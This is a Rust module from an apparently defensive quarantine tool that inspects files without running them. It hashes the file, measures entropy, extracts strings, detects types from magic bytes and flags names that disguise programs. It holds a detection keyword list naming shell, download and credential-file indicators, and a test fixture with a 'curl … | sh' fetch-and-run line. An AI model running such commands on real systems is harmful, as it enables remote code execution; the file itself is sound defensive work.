//! Looking inside a file without running it: what it really is, its hashes,
//! its readable strings and the rules it matches.
//!
//! Made for quarantine, where a file sits with no permissions at all; the
//! caller opens it for reading and seals it again. Everything is read as
//! bytes, and nothing is passed to a program that might interpret it.

use std::fs::File;
use std::io::Read;
use std::path::Path;

use md5::Md5;
use serde::Serialize;
use sha2::{Digest, Sha256};

use crate::content::{self, Limits};
use crate::rules::RuleHit;

/// How much of a file the strings come from.
const STRINGS_WINDOW: u64 = 16 * 1024 * 1024;
/// Strings kept for the list, and their longest.
const STRINGS_KEPT: usize = 400;
const STRING_CHARS: usize = 200;
/// A printable run shorter than this is noise.
const MIN_STRING: usize = 6;

#[derive(Serialize, Debug)]
pub struct Inspection {
    pub size: u64,
    /// What the bytes say the file is.
    pub kind: String,
    /// Set when the name promises one kind of file and the bytes are another.
    pub disguise: Option<String>,
    pub sha256: String,
    pub md5: String,
    /// Bits per byte, 0 to 8. Near 8 is compressed or encrypted.
    pub entropy: f64,
    pub strings: Vec<String>,
    pub strings_total: usize,
    /// Addresses, commands and paths among the strings, which are what a
    /// person looks for first.
    pub notable: Vec<String>,
    pub hits: Vec<RuleHit>,
    pub members: u32,
    pub unchecked: Vec<String>,
}

/// Reads a file through and says everything that can be said without running it.
pub fn inspect(path: &Path, original_name: &str, limits: &Limits) -> Result<Inspection, String> {
    let mut file = File::open(path).map_err(|e| format!("Cannot read the file: {e}"))?;
    let size = file.metadata().map(|m| m.len()).unwrap_or(0);

    let mut sha = Sha256::new();
    let mut md5 = Md5::new();
    let mut counts = [0u64; 256];
    let mut window = Vec::new();
    let mut buffer = vec![0u8; 64 * 1024];
    loop {
        let read = file.read(&mut buffer).map_err(|e| format!("Cannot read the file: {e}"))?;
        if read == 0 {
            break;
        }
        let chunk = &buffer[..read];
        sha.update(chunk);
        md5.update(chunk);
        for &byte in chunk {
            counts[byte as usize] += 1;
        }
        let room = (STRINGS_WINDOW as usize).saturating_sub(window.len());
        window.extend_from_slice(&chunk[..room.min(read)]);
    }

    let (strings, strings_total) = strings_of(&window);
    let notable = strings.iter().filter(|s| is_notable(s)).take(60).cloned().collect();
    let kind = identify(&window);
    let disguise = disguise(original_name, &kind);
    let report = content::inspect(path, limits);

    Ok(Inspection {
        size,
        kind: kind.describe(),
        disguise,
        sha256: hex(&sha.finalize()),
        md5: hex(&md5.finalize()),
        entropy: entropy(&counts, size),
        strings,
        strings_total,
        notable,
        hits: report.hits,
        members: report.members,
        unchecked: report.unchecked.iter().map(|u| u.sentence()).collect(),
    })
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

fn entropy(counts: &[u64; 256], size: u64) -> f64 {
    if size == 0 {
        return 0.0;
    }
    let total = size as f64;
    let bits: f64 = counts
        .iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = c as f64 / total;
            -p * p.log2()
        })
        .sum();
    (bits * 100.0).round() / 100.0
}

/// Printable runs, as ASCII and as UTF-16, which is how Windows programs keep text.
fn strings_of(data: &[u8]) -> (Vec<String>, usize) {
    let mut kept = Vec::new();
    let mut total = 0usize;
    let mut keep = |run: String| {
        total += 1;
        if kept.len() < STRINGS_KEPT {
            kept.push(run.chars().take(STRING_CHARS).collect());
        }
    };

    let printable = |b: u8| (0x20..0x7f).contains(&b) || b == b'\t';
    let mut start = None;
    for (i, &byte) in data.iter().enumerate() {
        match (printable(byte), start) {
            (true, None) => start = Some(i),
            (false, Some(s)) => {
                if i - s >= MIN_STRING {
                    keep(String::from_utf8_lossy(&data[s..i]).into_owned());
                }
                start = None;
            }
            _ => {}
        }
    }
    if let Some(s) = start.filter(|s| data.len() - s >= MIN_STRING) {
        keep(String::from_utf8_lossy(&data[s..]).into_owned());
    }

    // UTF-16 text can start on an even byte or an odd one.
    for offset in 0..2 {
        let mut wide = String::new();
        for pair in data.get(offset..).unwrap_or_default().chunks_exact(2) {
            if pair[1] == 0 && printable(pair[0]) {
                wide.push(pair[0] as char);
            } else {
                if wide.len() >= MIN_STRING {
                    keep(std::mem::take(&mut wide));
                }
                wide.clear();
            }
        }
        if wide.len() >= MIN_STRING {
            keep(wide);
        }
    }
    (kept, total)
}

fn is_notable(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    const WORDS: &[&str] = &[
        "http://", "https://", "ftp://", ".onion", "/tmp/", "/dev/shm", "/etc/passwd", "/etc/shadow", "crontab",
        "authorized_keys", "ld.so.preload", "powershell", "cmd.exe", "wscript", "rundll32", "regsvr32", "wget ",
        "curl ", "base64", "chmod +x", "nc -", "/bin/sh", "/bin/bash", "currentversion\\run", "frombase64string",
        "bitcoin", "monero", "stratum+tcp",
    ];
    WORDS.iter().any(|w| lower.contains(w)) || looks_like_address(text)
}

fn looks_like_address(text: &str) -> bool {
    text.split(|c: char| !(c.is_ascii_digit() || c == '.'))
        .any(|part| part.split('.').count() == 4 && part.parse::<std::net::Ipv4Addr>().is_ok())
}

#[derive(Debug, PartialEq)]
enum Kind {
    Elf { bits: u8, machine: &'static str, library: bool },
    Pe { machine: &'static str, library: bool },
    Dos,
    MachO,
    Script(String),
    Zip,
    Gzip,
    SevenZip,
    Rar,
    Tar,
    Bzip2,
    Xz,
    Zstd,
    Cab,
    Pdf,
    Ole,
    Rtf,
    Shortcut,
    Image(&'static str),
    Desktop,
    Html,
    Text,
    Data,
}

impl Kind {
    fn describe(&self) -> String {
        match self {
            Kind::Elf { bits, machine, library } => {
                format!("Linux {} (ELF), {bits}-bit, {machine}", if *library { "library or position-independent program" } else { "program" })
            }
            Kind::Pe { machine, library } => {
                format!("Windows {} (PE), {machine}", if *library { "library (DLL)" } else { "program" })
            }
            Kind::Dos => "DOS program".into(),
            Kind::MachO => "macOS program (Mach-O)".into(),
            Kind::Script(interpreter) => format!("Script for {interpreter}"),
            Kind::Zip => "ZIP archive, which is also what Office documents, JAR and APK files are".into(),
            Kind::Gzip => "gzip archive".into(),
            Kind::SevenZip => "7z archive".into(),
            Kind::Rar => "RAR archive".into(),
            Kind::Tar => "tar archive".into(),
            Kind::Bzip2 => "bzip2 archive".into(),
            Kind::Xz => "xz archive".into(),
            Kind::Zstd => "zstd archive".into(),
            Kind::Cab => "Windows cabinet archive".into(),
            Kind::Pdf => "PDF document".into(),
            Kind::Ole => "Old Office document or Windows installer (OLE)".into(),
            Kind::Rtf => "RTF document".into(),
            Kind::Shortcut => "Windows shortcut (LNK)".into(),
            Kind::Image(name) => format!("{name} image"),
            Kind::Desktop => "Desktop launcher".into(),
            Kind::Html => "HTML page".into(),
            Kind::Text => "Text".into(),
            Kind::Data => "Binary data of no known kind".into(),
        }
    }

    /// The families an extension can honestly belong to.
    fn family(&self) -> &'static str {
        match self {
            Kind::Elf { .. } | Kind::Pe { .. } | Kind::Dos | Kind::MachO => "program",
            Kind::Script(_) => "script",
            Kind::Zip | Kind::Gzip | Kind::SevenZip | Kind::Rar | Kind::Tar | Kind::Bzip2 | Kind::Xz | Kind::Zstd | Kind::Cab => "archive",
            Kind::Pdf | Kind::Ole | Kind::Rtf => "document",
            Kind::Image(_) => "image",
            Kind::Text | Kind::Html | Kind::Desktop => "text",
            Kind::Shortcut | Kind::Data => "other",
        }
    }
}

fn u16_le(data: &[u8], at: usize) -> Option<u16> {
    data.get(at..at + 2).map(|b| u16::from_le_bytes([b[0], b[1]]))
}

fn u32_le(data: &[u8], at: usize) -> Option<u32> {
    data.get(at..at + 4).map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
}

fn identify(head: &[u8]) -> Kind {
    if head.starts_with(b"\x7fELF") {
        let bits = if head.get(4) == Some(&2) { 64 } else { 32 };
        let big = head.get(5) == Some(&2);
        let read = |at: usize| {
            head.get(at..at + 2).map(|b| if big { u16::from_be_bytes([b[0], b[1]]) } else { u16::from_le_bytes([b[0], b[1]]) })
        };
        let machine = match read(18) {
            Some(0x3e) => "x86-64",
            Some(0x03) => "x86",
            Some(0xb7) => "ARM64",
            Some(0x28) => "ARM",
            Some(0xf3) => "RISC-V",
            Some(0x08) => "MIPS",
            _ => "another processor",
        };
        return Kind::Elf { bits, machine, library: read(16) == Some(3) };
    }
    if head.starts_with(b"MZ") {
        let Some(offset) = u32_le(head, 0x3c).map(|o| o as usize) else { return Kind::Dos };
        if head.get(offset..offset + 4) != Some(b"PE\0\0") {
            return Kind::Dos;
        }
        let machine = match u16_le(head, offset + 4) {
            Some(0x8664) => "x86-64",
            Some(0x14c) => "x86",
            Some(0xaa64) => "ARM64",
            _ => "another processor",
        };
        let library = u16_le(head, offset + 22).is_some_and(|c| c & 0x2000 != 0);
        return Kind::Pe { machine, library };
    }
    let starts = |magic: &[u8]| head.starts_with(magic);
    if starts(&[0xcf, 0xfa, 0xed, 0xfe]) || starts(&[0xce, 0xfa, 0xed, 0xfe]) || starts(&[0xca, 0xfe, 0xba, 0xbe]) && head.get(7).is_some_and(|&n| n < 20) {
        return Kind::MachO;
    }
    if starts(b"#!") {
        let line = head.split(|&b| b == b'\n').next().unwrap_or_default();
        let line = String::from_utf8_lossy(&line[2..]).trim().to_string();
        let mut words = line.split_whitespace();
        let first = words.next().unwrap_or("an unknown interpreter");
        let program = if first.ends_with("/env") { words.next().unwrap_or(first) } else { first };
        return Kind::Script(program.rsplit('/').next().unwrap_or(program).to_string());
    }
    if starts(b"PK\x03\x04") || starts(b"PK\x05\x06") {
        return Kind::Zip;
    }
    if starts(&[0x1f, 0x8b]) {
        return Kind::Gzip;
    }
    if starts(&[0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c]) {
        return Kind::SevenZip;
    }
    if starts(b"Rar!\x1a\x07") {
        return Kind::Rar;
    }
    if head.get(257..262) == Some(b"ustar") {
        return Kind::Tar;
    }
    if starts(b"BZh") {
        return Kind::Bzip2;
    }
    if starts(b"\xfd7zXZ\0") {
        return Kind::Xz;
    }
    if starts(&[0x28, 0xb5, 0x2f, 0xfd]) {
        return Kind::Zstd;
    }
    if starts(b"MSCF") {
        return Kind::Cab;
    }
    if starts(b"%PDF") {
        return Kind::Pdf;
    }
    if starts(&[0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]) {
        return Kind::Ole;
    }
    if starts(b"{\\rtf") {
        return Kind::Rtf;
    }
    if starts(&[0x4c, 0, 0, 0, 0x01, 0x14, 0x02, 0]) {
        return Kind::Shortcut;
    }
    if starts(b"\x89PNG") {
        return Kind::Image("PNG");
    }
    if starts(&[0xff, 0xd8, 0xff]) {
        return Kind::Image("JPEG");
    }
    if starts(b"GIF8") {
        return Kind::Image("GIF");
    }
    let sample = &head[..head.len().min(4096)];
    let text = std::str::from_utf8(sample).is_ok() || sample.iter().all(|&b| b >= 0x09 && b != 0x7f);
    if text && !sample.is_empty() {
        let lower = String::from_utf8_lossy(sample).to_ascii_lowercase();
        if lower.contains("[desktop entry]") {
            return Kind::Desktop;
        }
        if lower.trim_start().starts_with("<!doctype html") || lower.contains("<html") {
            return Kind::Html;
        }
        return Kind::Text;
    }
    Kind::Data
}

/// A sentence when the extension and the contents disagree.
fn disguise(name: &str, kind: &Kind) -> Option<String> {
    let extension = Path::new(name).extension()?.to_str()?.to_ascii_lowercase();
    let promised = match extension.as_str() {
        "pdf" | "doc" | "xls" | "ppt" | "rtf" | "msi" => "document",
        "jpg" | "jpeg" | "png" | "gif" | "bmp" | "webp" => "image",
        "txt" | "csv" | "log" | "md" | "html" | "htm" | "desktop" => "text",
        "zip" | "gz" | "tgz" | "7z" | "rar" | "tar" | "bz2" | "xz" | "zst" | "jar" | "apk" | "docx" | "xlsx" | "pptx" | "odt" | "ods" | "cab" => "archive",
        "exe" | "dll" | "scr" | "com" | "sys" | "so" | "bin" | "elf" | "appimage" => "program",
        "sh" | "py" | "pl" | "rb" | "bash" | "js" | "ps1" | "vbs" | "bat" | "cmd" => "script",
        _ => return None,
    };
    // A script is text, and an Office document is a zip or an OLE file.
    let fine = |family: &str| {
        family == promised
            || (promised == "script" && family == "text")
            || (promised == "text" && family == "script")
            || (promised == "document" && family == "archive")
    };
    if fine(kind.family()) {
        return None;
    }
    Some(format!("The name ends in .{extension}, but the contents say: {}.", kind.describe()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn programs_are_told_apart_by_their_headers() {
        let mut elf = b"\x7fELF\x02\x01\x01".to_vec();
        elf.resize(64, 0);
        elf[16] = 3;
        elf[18] = 0x3e;
        assert_eq!(identify(&elf), Kind::Elf { bits: 64, machine: "x86-64", library: true });

        let mut pe = vec![0u8; 0x100];
        pe[..2].copy_from_slice(b"MZ");
        pe[0x3c] = 0x80;
        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
        pe[0x84..0x86].copy_from_slice(&0x8664u16.to_le_bytes());
        assert_eq!(identify(&pe), Kind::Pe { machine: "x86-64", library: false });

        assert_eq!(identify(b"#!/usr/bin/env python3\nprint(1)\n"), Kind::Script("python3".into()));
        assert_eq!(identify(b"#!/bin/sh\n"), Kind::Script("sh".into()));
        assert_eq!(identify(b"plain words\n"), Kind::Text);
        assert_eq!(identify(&[0u8, 1, 2, 0xff, 0xfe]), Kind::Data);
    }

    #[test]
    fn a_program_named_like_a_document_is_called_out() {
        let pe = Kind::Pe { machine: "x86-64", library: false };
        let note = disguise("invoice.pdf", &pe).unwrap();
        assert!(note.contains(".pdf") && note.contains("Windows program"), "{note}");
        assert!(disguise("setup.exe", &pe).is_none());
        assert!(disguise("report.docx", &Kind::Zip).is_none());
        assert!(disguise("run.sh", &Kind::Text).is_none());
        assert!(disguise("no-extension", &pe).is_none());
    }

    #[test]
    fn strings_come_out_in_both_encodings_and_addresses_stand_out() {
        let mut data = b"\x00\x01curl http://203.0.113.9/x | sh\x00\x02ab\x00".to_vec();
        for c in "CurrentVersion\\Run".bytes() {
            data.extend([c, 0]);
        }
        data.extend([0xff, 0xff]);
        let (strings, total) = strings_of(&data);
        assert_eq!(total, 2, "{strings:?}");
        assert!(strings.iter().any(|s| s.ends_with("CurrentVersion\\Run")), "{strings:?}");
        assert!(strings.iter().all(|s| is_notable(s)));
    }

    #[test]
    fn the_whole_file_is_read_and_hashed() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("q.bin");
        std::fs::write(&path, crate::rules::samples::eicar()).unwrap();
        let limits = Limits::for_config(&crate::config::Config::default());
        let seen = inspect(&path, "readme.txt", &limits).unwrap();
        assert_eq!(seen.sha256, "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f");
        assert_eq!(seen.md5, "44d88612fea8a8f36de82e1278abb02f");
        assert!(seen.hits.iter().any(|h| h.rule.to_lowercase().contains("eicar")), "{:?}", seen.hits);
        assert_eq!(seen.kind, "Text");
        assert!(seen.entropy > 4.0 && seen.entropy < 6.0);
    }
}
